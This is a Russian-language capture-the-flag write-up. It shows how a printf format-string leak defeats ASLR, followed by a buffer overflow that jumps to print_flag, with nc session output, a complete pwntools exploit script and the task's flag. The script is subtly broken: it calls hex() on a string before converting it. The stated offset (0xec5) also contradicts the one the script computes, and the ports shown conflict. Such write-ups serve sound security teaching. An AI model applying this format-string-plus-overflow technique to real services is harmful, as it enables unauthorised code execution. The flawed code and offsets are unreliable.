# ОООверфлоу 2.0: Write-up

В этом таске мы встречаемся с бинарником, очень похожим на предыдущий таск — декомпилятор показывает точно такой же код.

Однако, запуск того же эксплойта не помогает: адрес не подходит. Запустив локально, например, с помощью `gdb`, обнаруживаем, что адреса функций изменились. Более того, каждый раз они становятся случайными. Это значит, что в таске появился ASLR (как и было указано в подсказке).

Получить флаг нам поможет вывод имени. После того, как мы отвечаем на вопрос, с нами здороваются. Но как? Ответ, как всегда, нам даёт декомпилятор:

```c
  printf("Hello, ");
  printf(&name);
```

Вроде бы всё хорошо, но на самом деле **никогда** не стоит выводить пользовательские данные в первом аргументе функции `printf`. Предположим, пользователь введет имя `%d`:

```
$ nc -v ugractf.ru 5003
Connection to ugractf.ru 5003 port [tcp/*] succeeded!
Segfault v. 1.0
Copyright 2019, OOO "TP"

What's your name?
%d
Hello, -540196773
```

Всё очень просто: `printf("%d", x);` печатает число `x`. Но если у `printf` нет аргумента, то поведение не определено. Существующие реализации стандартной библиотеки начинают просто использовать данные со стека. Таким образом, можно слить все данные на стеке.

Поскольку на сервере 64-битная архитектура, пользуемся модификатором `%lx`, который сливает 8 байт стека. Замечаем, что выводы локально и на сервере сильно различаются: это связано с тем, что локально скорее всего используется `glibc`, а на сервере был Alpine, в котором по умолчанию `musl`. Можно было применить следующую идею: таски ОООверфлоу и ОООверфлоу 2.0 запущены на одинаковых хостах. Адреса в первом таске мы знаем, поэтому искать их в выводе можно было там.

Обнаруживаем, что `%lx` сразу же даёт нам один адрес из библиотеки:

```
$ nc -v ugractf.ru 5002
Connection to ugractf.ru 5002 port [tcp/rfe] succeeded!
Segfault v. 1.0
Copyright 2019, OOO "TP"

What's your name?
%lx
Hello, 40205b
```

Осталось лишь понять, что рандомизация адресов меняет сами адреса, но не разницу между ними, поэтому слив любой адрес, мы получаем адреса всех функций. Во втором задании в бинарном файле функция `print_flag` лежит по адресу `0x11a9` (в отличие от `0x1196` в первом), поэтому слитый адрес всегда будет ровно на 0xec5 отличаться от адреса функции `print_flag`.

Соответственно, переполнить мы этим же чтением адрес возврата не сможем, но у нас есть второе приглашение, которое позволяет сделать то же самое.

Эксплойт для получения флага:

```python3
#!/usr/bin/env python3

from pwn import process, remote, p64
from random import randint
from re import findall

r = remote('ugractf.ru', 5003)
    
greeting = r.recvuntil(b'name?\n')
r.sendline(b'%lx')

address = findall('Hello, ([0-9a-f]+)', r.recvuntil('\n').decode())[0]
print("[*] Leaked address =", hex(address))
    
offset = 0x11a9 - 0x205b # print_flag - (leaked_address)
address = int(address, 16) + offset

print("[*] Flag address =", hex(address))

greeting = r.recvuntil(b'data?\n')
r.sendline(b'A' * 72 + p64(address))

data = r.recvall()
print(data)
```

Флаг: **ugra_45lr_is_not_a_pr0bl3m**
